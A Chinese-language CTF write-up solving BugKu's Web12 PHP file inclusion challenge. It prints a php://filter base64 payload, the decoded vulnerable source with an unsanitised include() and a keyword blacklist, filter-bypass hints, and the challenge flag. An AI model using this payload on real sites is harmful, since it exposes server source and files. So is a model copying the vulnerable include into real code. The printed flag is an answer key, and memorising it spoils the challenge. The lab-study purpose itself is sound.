# BugKu Web12 - 文件包含



## 题目信息

- **平台**: [BugKu CTF](https://ctf.bugku.com/)

- **类型**: Web

- **难度**: ⭐⭐

- **金币**: 2

- **分数**: 20



## 题目描述

打开题目后，页面上只有一个超链接 "click me? no"，点击后页面显示一段提示文字，URL 中出现了 `file=show.php` 的传参。



## 解题过程



### 1. 打开题目

访问链接，看到页面上只有一个超链接。



### 2. 点击超链接

点击 "click me? no" 后，页面跳转，URL 变为：`index.php?file=show.php`

页面显示提示内容，查看源码也没有发现 flag。



### 3. 分析漏洞

从 URL 可以看出这是一个 **文件包含漏洞**（Local File Inclusion, LFI）。

`file` 参数通过 `include()` 函数直接引入文件，可以尝试利用 PHP 伪协议读取敏感文件源码。



### 4. 利用 PHP 伪协议读取源码

由于 PHP 文件直接访问会被解析执行，无法看到源码。利用 `php://filter` 伪协议将文件内容以 Base64 编码输出，即可获取源码：

```
?file=php://filter/read=convert.base64-encode/resource=index.php
```

访问后得到一段 Base64 编码的字符串。



### 5. Base64 解码

将得到的 Base64 编码进行解码，得到 `index.php` 的完整源码：

```php
ï»¿<html>
    <title>Bugku-web</title>
    
<?php
	error_reporting(0);
	if(!$_GET[file]){echo '<a href="./index.php?file=show.php">click me? no</a>';}
	$file=$_GET['file'];
	if(strstr($file,"../")||stristr($file, "tp")||stristr($file,"input")||stristr($file,"data")){
		echo "Oh no!";
		exit();
	}
	include($file); 
//flag:flag{409932e0616b76db6b96316c018cd9ee}
?>
</html>

```



### 6. 获取 Flag

在源码的注释中发现 flag：

```
flag{409932e0616b76db6b96316c018cd9ee}
```



## 涉及知识点

- **文件包含漏洞（LFI）**: 当 Web 应用使用用户可控的输入作为文件路径进行 `include()` / `require()` 时，可能导致任意文件读取或代码执行。

- **PHP 伪协议 `php://filter`**: 可以对文件内容进行编码/解码等操作，常用于读取 PHP 源码（避免被解析执行）。常用 payload：
  ```
  php://filter/read=convert.base64-encode/resource=目标文件
  ```

- **过滤绕过思路**: 本题过滤了 `../`、`tp`、`input`、`data` 等关键字，但 `php://filter` 未被过滤，直接可用。如果过滤更严格，可尝试其他伪协议或路径变形。



## 参考

- [BugKu CTF 平台](https://ctf.bugku.com/)
